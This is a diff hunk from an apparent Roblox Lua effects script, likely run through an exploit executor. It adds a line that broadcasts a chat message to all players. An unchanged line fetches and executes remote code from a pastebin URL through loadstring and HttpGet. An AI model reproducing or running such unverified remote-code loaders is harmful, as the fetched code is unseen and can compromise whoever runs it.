@@ -906,6 +906,9 @@ child.Color = ColorSequence.new(Color3.fromRGB(160, 32, 240)) -- Set color to gr
 task.wait(0.1)
 loadstring(game:HttpGet('https://pastebin.com/raw/8q38wvvK'))()
 task.wait(0.1)
+message = "I Truly Am A Curse!!!"
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+task.wait(0.1)
 local red4_7 = game.ReplicatedStorage.Resources.StoicBomb["OHNO"].Normal.Attachment:Clone()
 red4_7.Parent = game.Players.LocalPlayer.Character["Torso"]
 for _, child in ipairs(red4_7:GetChildren()) do
